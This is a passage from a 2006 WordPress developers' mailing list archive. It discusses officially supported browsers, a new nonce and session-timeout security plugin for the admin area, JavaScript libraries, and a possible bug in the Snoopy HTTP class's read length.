alienating a certain number of your potential customers and perhaps labeling
yourself an elitist. :)

From elharo at metalab.unc.edu  Wed Apr 26 14:36:56 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Wed Apr 26 14:41:50 2006
Subject: [wp-hackers] Officially supported browsers. was:
	Security	atWordpress
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF9809C@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF9809C@dsimail.drbsystems.com>
Message-ID: <444F8588.4000103@metalab.unc.edu>

Brian Layman wrote:

> That said, PC Magazine just reported that they tested having a "This Site is
> best viewed in XYZ" label on a site and found that a significant number
> first time visitors not having that browser did not come back. It was a
> double digits percentage (I want to say 29% but that sounds way high).  
> 

Do you have a URL or page number/month/year cite on that? Or did they 
report it somewhere other than PC Mag? I couldn't find that on their 
site or with Google.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From Brian at TheCodeCave.com  Wed Apr 26 14:41:07 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Wed Apr 26 14:45:25 2006
Subject: [wp-hackers] Officially supported browsers.
In-Reply-To: <444F8588.4000103@metalab.unc.edu>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF9809D@dsimail.drbsystems.com>

Elliotte Rusty Harold said:
>Do you have a URL or page number/month/year cite on that? 
I'll see if I can dig it up.  I've got four issues sitting beside me. It
should be in one of them.  I'll let you know.

From tom.armitage at gmail.com  Wed Apr 26 14:48:14 2006
From: tom.armitage at gmail.com (Tom Armitage)
Date: Wed Apr 26 14:52:27 2006
Subject: [wp-hackers] Officially supported browsers. was: Security
	atWordpress
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF9809C@dsimail.drbsystems.com>
References: <69898D91-11BC-4F3A-8824-7D3F27D6CDD4@kirabug.com>
	<D0252C90757CBC4B8BC938A72BEDDF9DF9809C@dsimail.drbsystems.com>
Message-ID: <948601250604260748y75f28ea1l61202b060cb6d83a@mail.gmail.com>

On 26/04/06, Brian Layman <Brian@thecodecave.com> wrote:
>
> That said, PC Magazine just reported that they tested having a "This Site
> is
> best viewed in XYZ" label on a site and found that a significant number
> first time visitors not having that browser did not come back. It was a
> double digits percentage (I want to say 29% but that sounds way high).



We're not talking about a "best viewed in", though. We're just saying that,
in the T&C or whatever, Wordpress has only been tested with [LONG LIST OF
BROWSERS] and we cannot guarantee or support behaviour (successful or
otherwise) in other browsers.

The list of things Wordpress supports is quite comprehensive; it's not like
saying "best viewed in Firefox" which might scare people off.

To be honest, "best view in FOO" is all a bit 1996 anyway.
From wp at ebroder.net  Wed Apr 26 15:00:58 2006
From: wp at ebroder.net (Evan Broder)
Date: Wed Apr 26 15:07:02 2006
Subject: [wp-hackers] Officially supported browsers. was:
	Security	atWordpress
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF9809C@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF9809C@dsimail.drbsystems.com>
Message-ID: <444F8B2A.5040902@ebroder.net>

Brian Layman wrote:
> So, if you aren't going to boast
> that you support all the major browsers, you should realize that you are
> alienating a certain number of your potential customers and perhaps labeling
> yourself an elitist. :)
Uh...point of information: We do this already. Remember the BrowseHappy
sticker that comes up in wp-admin if you're using IE?

- Evan
From davebytes at comcast.net  Wed Apr 26 15:34:29 2006
From: davebytes at comcast.net (David Chait)
Date: Wed Apr 26 15:37:57 2006
Subject: [wp-hackers] Officially supported browsers. was:
	SecurityatWordpress
References: <69898D91-11BC-4F3A-8824-7D3F27D6CDD4@kirabug.com><D0252C90757CBC4B8BC938A72BEDDF9DF9809C@dsimail.drbsystems.com>
	<948601250604260748y75f28ea1l61202b060cb6d83a@mail.gmail.com>
Message-ID: <006001c66946$e8eab180$6e01a8c0@sixfour>

frankly, this is impossible to do, as it is completely reliant on the theme 
and css, which (at pretty much any level) WP has no control over...

Some themes/sites might have full accessibility, work across nearly any 
browser.  Some might only work in the latest and greatest due to CSS 
trickery, et al.

just imho. ;)

-d

----- Original Message ----- 
From: "Tom Armitage" <tom.armitage@gmail.com>
To: <wp-hackers@lists.automattic.com>
Sent: Wednesday, April 26, 2006 10:48 AM
Subject: Re: [wp-hackers] Officially supported browsers. was: 
SecurityatWordpress


On 26/04/06, Brian Layman <Brian@thecodecave.com> wrote:
>
> That said, PC Magazine just reported that they tested having a "This Site
> is
> best viewed in XYZ" label on a site and found that a significant number
> first time visitors not having that browser did not come back. It was a
> double digits percentage (I want to say 29% but that sounds way high).



We're not talking about a "best viewed in", though. We're just saying that,
in the T&C or whatever, Wordpress has only been tested with [LONG LIST OF
BROWSERS] and we cannot guarantee or support behaviour (successful or
otherwise) in other browsers.

From tom.armitage at gmail.com  Wed Apr 26 15:36:21 2006
From: tom.armitage at gmail.com (Tom Armitage)
Date: Wed Apr 26 15:40:34 2006
Subject: [wp-hackers] Officially supported browsers. was:
	SecurityatWordpress
In-Reply-To: <006001c66946$e8eab180$6e01a8c0@sixfour>
References: <69898D91-11BC-4F3A-8824-7D3F27D6CDD4@kirabug.com>
	<D0252C90757CBC4B8BC938A72BEDDF9DF9809C@dsimail.drbsystems.com>
	<948601250604260748y75f28ea1l61202b060cb6d83a@mail.gmail.com>
	<006001c66946$e8eab180$6e01a8c0@sixfour>
Message-ID: <948601250604260836o3f7f92ei730321282095c1d2@mail.gmail.com>

On 26/04/06, David Chait <davebytes@comcast.net> wrote:
>
> frankly, this is impossible to do, as it is completely reliant on the
> theme
> and css, which (at pretty much any level) WP has no control over...
>
> Some themes/sites might have full accessibility, work across nearly any
> browser.  Some might only work in the latest and greatest due to CSS
> trickery, et al.
>
> just imho. ;)
>
> -d



Again, misunderstanding. We're not talking about what is *displayed* on the
site (ie theme/template/whatever); we're talking about the application
itself, the most obvious part of which is wp-admin.


I thought that was obvious...
From Brian at TheCodeCave.com  Wed Apr 26 15:46:53 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Wed Apr 26 15:51:12 2006
Subject: [wp-hackers] Officially supported browsers.
In-Reply-To: <444F8B2A.5040902@ebroder.net>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF9809E@dsimail.drbsystems.com>

Evan wrote:
> We do this already. Remember the BrowseHappy sticker

Yes, and that's cool (though the graphic is a bit to sixties for my tastes).
WordPress is great on this subject as it is now.  

I was just responding to the Anne's specific wording "We support X".  I
wanted to emphasize that if X is just one thing, you're turning people away.
They are a pet peeve of mine.  To me it means "I didn't have the
experience/knowledge/time/respect/intelligence to design my site to work
well for you.".  Providing a compliance tag (or listing multiple browsers)
says the exact opposite.

I probably replied because I'd just read all of the responses to the
PCWorld's announcement of the new IE7 beta
(http://blogs.pcworld.com/staffblog/archives/001916.html )and I'm getting a
bit tired of the  "helpful" 14 years olds that know which browser has the
features that best fit my use case.  The attitudes in those response is the
same as what's often at the heart of a "Best viewed with" site.  [RANT] The
readers there are way too eager to jump on everyone else in order to try to
build up their own reputation.  
You help people by responding patiently, not by attacking them.  Yes, it's
easy to lose your cool if you've already answered the same particular
question for 60 random commenters, but that shouldn't mean you jump down
#61's throat.[/RANT]

Gee, where'd all that come from? I guess I needed to vent!



From tom.armitage at gmail.com  Wed Apr 26 16:02:51 2006
From: tom.armitage at gmail.com (Tom Armitage)
Date: Wed Apr 26 16:07:07 2006
Subject: [wp-hackers] Officially supported browsers.
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF9809E@dsimail.drbsystems.com>
References: <444F8B2A.5040902@ebroder.net>
	<D0252C90757CBC4B8BC938A72BEDDF9DF9809E@dsimail.drbsystems.com>
Message-ID: <948601250604260902w4152f0e5ld856a0b45f2aeac9@mail.gmail.com>

On 26/04/06, Brian Layman <Brian@thecodecave.com> wrote:
>
> Evan wrote:
> > We do this already. Remember the BrowseHappy sticker
>
> Yes, and that's cool (though the graphic is a bit to sixties for my
> tastes).
> WordPress is great on this subject as it is now.
>
> I was just responding to the Anne's specific wording "We support X".  I
> wanted to emphasize that if X is just one thing, you're turning people
> away.
> They are a pet peeve of mine.  To me it means "I didn't have the
> experience/knowledge/time/respect/intelligence to design my site to work
> well for you.".  Providing a compliance tag (or listing multiple browsers)
> says the exact opposite.


I've already suggested that count(X) == 1 is a BAD thing and not what I
meant.

X should be a broadish church, eg, "IE/Win 6.0+, Firefox 1.0+, Safari 1.0+,
Camino x.x+, Konqueror x.x+, Mozilla 1.7 (and variants)".
From Brian at TheCodeCave.com  Wed Apr 26 16:08:47 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Wed Apr 26 16:13:08 2006
Subject: [wp-hackers] A plugin to disable the Referer check and add nonces
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF9809F@dsimail.drbsystems.com>

I wrote my first WordPress plugin yesterday.  I called it "SN4WP: Simple
Nonces 4 WordPress".  Everyone was talking about creating a plugin to
disable the admin referer check, so I thought I'd take a whack at it.  It
isn't as good as what you can do with nonces outside of the plugin
restrictions, but it should help the situation.

Primary Features:
* Enables/Disables Referer check (Disabled by default) 
* Adds an optional "One IP per Admin Session" check (Disabled by default) 
* Times out sessions after inactivity (10 Minutes by default) 
* Posting - which takes longer - has a different time out period (30 Minutes
by default) 
* All features are configurable on a plugin options tab 

Since you all are familiar with the whole nonce/referer issue, would any of
you care to do some testing for me and tell me if I missed anything or did
anything wrong as far as WP plug in is concerned?  Like I said, this was my
first attempt at a plugin - but it seemed to be straight forward.  That
said, if you aren't comfortable with testing an alpha plugin on your own
board, who could blame ya.  The plug in should have zero effect outside of
the admin windows, if that's a comfort.  

It's available (with more info) here:
http://www.thecodecave.com/?p=106

From davebytes at comcast.net  Wed Apr 26 16:35:11 2006
From: davebytes at comcast.net (David Chait)
Date: Wed Apr 26 16:38:37 2006
Subject: [wp-hackers] Officially supported browsers.
	was:SecurityatWordpress
References: <69898D91-11BC-4F3A-8824-7D3F27D6CDD4@kirabug.com><D0252C90757CBC4B8BC938A72BEDDF9DF9809C@dsimail.drbsystems.com><948601250604260748y75f28ea1l61202b060cb6d83a@mail.gmail.com><006001c66946$e8eab180$6e01a8c0@sixfour>
	<948601250604260836o3f7f92ei730321282095c1d2@mail.gmail.com>
Message-ID: <007b01c6694f$636df040$6e01a8c0@sixfour>

I'd think browser support would be much more of a 'reader facing' issue than 
an 'admin facing' issue.  That's not to say that wp-admin area isn't 
important to keep highly functional. ;)

But now, in hindsight, given the discussion of securing the admin area, I 
guess I can understand why the question was regarding what browsers properly 
support the admin area (or vice-versa)... ah well.

I'm guessing a list could be compiled, and that the lead devs probably have 
some set in their minds (and on their computers)...

-d

----- Original Message ----- 
From: "Tom Armitage" <tom.armitage@gmail.com>
To: <wp-hackers@lists.automattic.com>
Sent: Wednesday, April 26, 2006 11:36 AM
Subject: Re: [wp-hackers] Officially supported browsers. 
was:SecurityatWordpress


On 26/04/06, David Chait <davebytes@comcast.net> wrote:
>
> frankly, this is impossible to do, as it is completely reliant on the
> theme
> and css, which (at pretty much any level) WP has no control over...
>
> Some themes/sites might have full accessibility, work across nearly any
> browser.  Some might only work in the latest and greatest due to CSS
> trickery, et al.
>
> just imho. ;)
>
> -d



Again, misunderstanding. We're not talking about what is *displayed* on the
site (ie theme/template/whatever); we're talking about the application
itself, the most obvious part of which is wp-admin.


I thought that was obvious... 

From wp-hackers at paul-mitchell.me.uk  Wed Apr 26 16:48:15 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Wed Apr 26 16:53:21 2006
Subject: [wp-hackers] Officially supported browsers.
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF9809E@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF9809E@dsimail.drbsystems.com>
Message-ID: <444FA44F.1010600@paul-mitchell.me.uk>

Brian Layman wrote:
> To me it means "I didn't have the
> experience/knowledge/time/respect/intelligence ...
*cough* money *cough*

Paul

PS: +1 Rant

From stewart at ugelow.com  Wed Apr 26 18:37:24 2006
From: stewart at ugelow.com (Stewart Ugelow)
Date: Wed Apr 26 18:41:55 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <444F23BA.3060508@mullenweg.com>
References: <444B8205.8070200@concept64.com>
	<1E9B621A-B9A4-4999-B332-ECAC4924E26C@turbonet.com>
	<444F23BA.3060508@mullenweg.com>
Message-ID: <7c94a5850604261137v5d298f86jbfed7774ecdd9057@mail.gmail.com>

On 4/26/06, Matt Mullenweg <m@mullenweg.com> wrote:

> In addition to prototype, I think whoever takes ownership of this should
> take a strong look at:
>
> http://www.mochikit.com/
> http://dojotoolkit.org/

Jon Aquino of Ning blogged about Prototype vs. Dojo last week:

http://jonaquino.blogspot.com/2006/04/comparison-of-dojo-and-prototype.html

--Stewart

--

Stewart Ugelow
www.ugelow.com
From bmygal at gmail.com  Wed Apr 26 22:46:41 2006
From: bmygal at gmail.com (Brian)
Date: Wed Apr 26 22:50:58 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <7c94a5850604171108o5ab143d6qf38e49db3426c5b3@mail.gmail.com>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
	<294271AF-2818-406F-A542-FFA202140A0B@txfx.net>
	<7c94a5850604171108o5ab143d6qf38e49db3426c5b3@mail.gmail.com>
Message-ID: <c8d0d7750604261546y1a7e53bdi8676ced0639b399b@mail.gmail.com>

Anyone out there have any luck finding/building a working GeoComments
plugin?


On 4/17/06, Stewart Ugelow <stewart@ugelow.com> wrote:
>
> Owen, Mark, Dougal et al,
>
> Thanks much for your explanations. Much good stuff to ponder. Some of
> these DB issues seem positively like black magic and hearing your
> thoughts is quite helpful.
>
> --Stewart
>
> P.S. Mark, I'm guessing a fair chunk of your post meta table is Kramer
> inbound data, no? :)
>
> On 4/13/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
>
> > My post meta table is huge... tens of thousands of entries...
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From leftjustified at gmail.com  Thu Apr 27 00:50:20 2006
From: leftjustified at gmail.com (Andrew Krespanis)
Date: Thu Apr 27 00:54:36 2006
Subject: [wp-hackers] Officially supported browsers. was:
	SecurityatWordpress
In-Reply-To: <006001c66946$e8eab180$6e01a8c0@sixfour>
References: <69898D91-11BC-4F3A-8824-7D3F27D6CDD4@kirabug.com>
	<D0252C90757CBC4B8BC938A72BEDDF9DF9809C@dsimail.drbsystems.com>
	<948601250604260748y75f28ea1l61202b060cb6d83a@mail.gmail.com>
	<006001c66946$e8eab180$6e01a8c0@sixfour>
Message-ID: <6453a6e90604261750i63fa568dk8e99d11107cddbbc@mail.gmail.com>

On 4/27/06, David Chait <davebytes@comcast.net> wrote:
> frankly, this is impossible to do, as it is completely reliant on the theme
> and css, which (at pretty much any level) WP has no control over...

That's the whole point. Put together the list of officially supported
browsers and ensure all default WP components work as expected in
these browsers. It is then up to the individual theme/plugin
developers to ensure their contributions work in the same browsers; if
not, they can/should alert potential users.

Complete compliance shouldn't be mandatory, but if there is a list to
check against at least developers & designers know what's expected and
WP users can know what to expect when downloading plugins and themes.
Theoretically, it would be a case of "works with all WP supported
browsers unless noted otherwise".


We could easily put the list together, but it needs to be Officially
Endorsed and the cut offs need to be thought about, not just "well
that browser sucked before version X".

The AJAX features are an interesting one when considering officially
supported browsers. What version of Opera do these work with? 7? 7.5?
8? Same with Safari... last I checked tinyMCE was almost unusable in
anything less than safari 2. That shouldn't make safari 2 the minimum
req' though, as WP functions just fine without wysiwyg. I'm assuming
all the admin AJAX degrades to traditional links and form submissions
when not available? If so, the browsers that display all the CSS but
might duff the AJAX (eg: opera 7.0?) would be perfect candidates for
the Partial Support list.

IMO it's more important to work out what isn't supported and why; as
non-support and partial support are more of a legacy thing.

==No support==
Opera < 6 (perhaps < 7 ?)
Netscape < 6 ?
Konquerer < ??

==Partial Support==
IE mac (any mac users want to check out the svn build on IE?)
Opera < 8 (any of the ajax not work in 7?)
Netscape < 8
Konquerer < ?? need linux user input please :)

Just a start...

-Andrew
From lists at kirabug.com  Thu Apr 27 00:51:24 2006
From: lists at kirabug.com (Anne Gibson)
Date: Thu Apr 27 00:55:42 2006
Subject: [wp-hackers] Officially supported browsers.
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF9809E@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF9809E@dsimail.drbsystems.com>
Message-ID: <02D7FB82-9104-481C-9414-98A8C90A2C30@kirabug.com>


On Apr 26, 2006, at 11:46 AM, Brian Layman wrote:

> I was just responding to the Anne's specific wording "We support  
> X".  I wanted to emphasize that if X is just one thing, you're  
> turning people away. They are a pet peeve of mine.  To me it means  
> "I didn't have the experience/knowledge/time/respect/intelligence  
> to design my site to work well for you.".

My apologies. Bad wording on my part. As someone mentioned later in  
the thread, I meant X for multiple values of X :) Believe me, as a  
Safari user I can relate to your pet peeve regarding people who say  
"We support X" for single values of X.

> Providing a compliance tag (or listing multiple browsers) says the  
> exact opposite.

This is more what I meant. Example: at the large nameless company  
where I work, we support all the browser/operating system combos   
that our website reports indicate are more than 2% of our traffic for  
3+ months - so right now, that's IE 6+ for Windows, Firefox 1.0+ for  
Windows/Mac, Safari 1.3+ for Mac, and Netscape 8+ for Windows. (*nix  
operating systems, for our specific company, are still running at  
less than 1% usage).  So we list these on the site, and callers who  
aren't using these are encouraged to test their malfunctioning  
functionality in a supported browser to confirm whether it's truly a  
site bug or just a browser with an odd interpretation of the rules.


> Gee, where'd all that come from? I guess I needed to vent!

Venting's good :) Better than exploding. Exploding's bad.

On Apr 26, 2006, at 12:35 PM, David Chait wrote:
> I'd think browser support would be much more of a 'reader facing'  
> issue than an 'admin facing' issue.  That's not to say that wp- 
> admin area isn't important to keep highly functional. ;)
>
> But now, in hindsight, given the discussion of securing the admin  
> area, I  guess I can understand why the question was regarding what  
> browsers properly support the admin area (or vice-versa)... ah well.

Regardless of which of the Wordpress pages a user is looking at, the  
'reader' or 'admin', they're all, at some level, users. And lacking a  
remote-control user cattle prod / shock collar (when I invent this  
gadget I'll make a mint) we can't control what browsers clients use  
-- but we can encourage them toward ones we've already tested.

We have a "base" install of Wordpress - which includes the Admin  
areas, as well as a few base themes that come preinstalled. Surely  
these have been thoroughly tested in some set of browsers, or they  
wouldn't be as stable and effective as they've behaved so far. So,  
uh, which ones are those? Do we post it somewhere I just haven't seen  
it? (I'm not discounting the possibility that I've looked through it.)

thanks for listening :)
anne gibson 
From jeremy.visser at gmail.com  Fri Apr 28 03:41:21 2006
From: jeremy.visser at gmail.com (Jeremy Visser)
Date: Fri Apr 28 03:45:43 2006
Subject: [wp-hackers] Bug in class-snoopy.php causes Dashboard script to
	unexpectedly halt
Message-ID: <43253ec50604272041w2bfb957fy26c692975aca9060@mail.gmail.com>

I'm not sure exactly which is the right list to post in, so I thought I'd
post in both WP-Hackers and WP-Testers.

About a week ago, I was having some
trouble<http://narnia.bounceme.net/jeremy/2006/04/21/bad-snoopy/>with
my Dashboard only displaying half a page which I though was due to
having WP-SlimStat installed, as the problem only occurred when the plugin
was activated, but later found out it was probably because the extra memory
WP-SlimStat used helped push it past the tipping point.

I eventually discovered that this was actually due to a strangely set value
in class-snoopy.php. The $maxlength value, which was used in the
_httprequest() function, was set to 500000 bytes. Snoopy was passing this
value to fread() which only accepts up to 8192 bytes, which means that
having $maxlength set to 500000 bytes is completely pointless. Although in
most cases, fread will work fine, in my case it was causing problems with
the script suddenly terminating without a trace. Changing $maxlength to 8192
fixed the problem.

I also noticed that the Test
Track<http://www.tamba2.org.uk/wordpress/TestTrack/>was also
experiencing the same symptoms when I was logged on to it the other
day. This means that I am probably not alone in this strange behaviour.

I have filed a bug
report<http://sourceforge.net/tracker/index.php?func=detail&aid=1474137&group_id=2091&atid=102091>on
snoopy.sf.net <http://sourceforge.net/projects/snoopy/> , but I doubt that
it will be fixed. I would like to see the next release of WordPress have
$maxlength set to 8192 out of the box, as I think this will fix some
problems with the class.

--
Jeremy Visser
Email: jeremy.visser@gmail.com
Website: http://jeremy.serveblog.net/
From peter.westwood at ftwr.co.uk  Fri Apr 28 08:10:00 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri Apr 28 08:14:22 2006
Subject: [wp-hackers] Bug in class-snoopy.php causes Dashboard script
	to	unexpectedly halt
In-Reply-To: <43253ec50604272041w2bfb957fy26c692975aca9060@mail.gmail.com>
References: <43253ec50604272041w2bfb957fy26c692975aca9060@mail.gmail.com>
Message-ID: <4451CDD8.4040609@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Jeremy Visser wrote:
> I eventually discovered that this was actually due to a strangely set value
> in class-snoopy.php. The $maxlength value, which was used in the
> _httprequest() function, was set to 500000 bytes. Snoopy was passing this
> value to fread() which only accepts up to 8192 bytes, which means that
> having $maxlength set to 500000 bytes is completely pointless. Although in
> most cases, fread will work fine, in my case it was causing problems with
> the script suddenly terminating without a trace. Changing $maxlength to 8192
> fixed the problem.
> 

Looking at the php docs for fread [1] are you sure that the limit of
8192 applies in this situation.  Reading through that page I think it
only applies to streams opened on local files not remote files over
ftp/http/whatever.

> I also noticed that the Test
> Track<http://www.tamba2.org.uk/wordpress/TestTrack/>was also
> experiencing the same symptoms when I was logged on to it the other
> day. This means that I am probably not alone in this strange behaviour.
> 
> I have filed a bug
> report<http://sourceforge.net/tracker/index.php?func=detail&aid=1474137&group_id=2091&atid=102091>on
> snoopy.sf.net <http://sourceforge.net/projects/snoopy/> , but I doubt that
> it will be fixed. I would like to see the next release of WordPress have
> $maxlength set to 8192 out of the box, as I think this will fix some
> problems with the class.
> 

Raise a ticket on trac[2] if you want something fixed in WordPress

[1] http://www.php.net/manual/en/function.fread.php
[2] http://trac.wordpress.org

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFEUc3YVPRdzag0AcURAulkAKCxvBpDanZjIbSCaTAvVwnPsl5DaACeOxd8
T9jSs50QNDM2TTmElFnH3Qs=
=so2t
-----END PGP SIGNATURE-----

From jeremy.visser at gmail.com  Fri Apr 28 08:12:46 2006
From: jeremy.visser at gmail.com (Jeremy Visser)
Date: Fri Apr 28 08:19:33 2006
Subject: [wp-hackers] Bug in class-snoopy.php causes Dashboard script to
	unexpectedly halt
In-Reply-To: <4451CDD8.4040609@ftwr.co.uk>
References: <43253ec50604272041w2bfb957fy26c692975aca9060@mail.gmail.com>
	<4451CDD8.4040609@ftwr.co.uk>
Message-ID: <43253ec50604280112k29aff39as945b05d9799d9fdb@mail.gmail.com>

Cool, thanks for the tips.

On 4/28/06, Peter Westwood <peter.westwood@ftwr.co.uk> wrote:
>
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
>
> Jeremy Visser wrote:
> > I eventually discovered that this was actually due to a strangely set
> value
> > in class-snoopy.php. The $maxlength value, which was used in the
> > _httprequest() function, was set to 500000 bytes. Snoopy was passing
> this
> > value to fread() which only accepts up to 8192 bytes, which means that
> > having $maxlength set to 500000 bytes is completely pointless. Although
> in
> > most cases, fread will work fine, in my case it was causing problems
> with
> > the script suddenly terminating without a trace. Changing $maxlength to
> 8192
> > fixed the problem.
> >
>
> Looking at the php docs for fread [1] are you sure that the limit of
> 8192 applies in this situation.  Reading through that page I think it
> only applies to streams opened on local files not remote files over
> ftp/http/whatever.
>
> > I also noticed that the Test
> > Track<http://www.tamba2.org.uk/wordpress/TestTrack/>was also
> > experiencing the same symptoms when I was logged on to it the other
> > day. This means that I am probably not alone in this strange behaviour.
> >
> > I have filed a bug
> > report<
> http://sourceforge.net/tracker/index.php?func=detail&aid=1474137&group_id=2091&atid=102091
> >on
> > snoopy.sf.net <http://sourceforge.net/projects/snoopy/> , but I doubt
> that
> > it will be fixed. I would like to see the next release of WordPress have
> > $maxlength set to 8192 out of the box, as I think this will fix some
> > problems with the class.
> >
>
> Raise a ticket on trac[2] if you want something fixed in WordPress
>
> [1] http://www.php.net/manual/en/function.fread.php
> [2] http://trac.wordpress.org
>
> westi
> - --
> Peter Westwood
> http://blog.ftwr.co.uk
> -----BEGIN PGP SIGNATURE-----
> Version: GnuPG v1.4.2 (MingW32)
> Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
>
> iD8DBQFEUc3YVPRdzag0AcURAulkAKCxvBpDanZjIbSCaTAvVwnPsl5DaACeOxd8
> T9jSs50QNDM2TTmElFnH3Qs=
> =so2t
> -----END PGP SIGNATURE-----
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



--
Jeremy Visser
Email: jeremy.visser@gmail.com
Website: http://jeremy.serveblog.net/
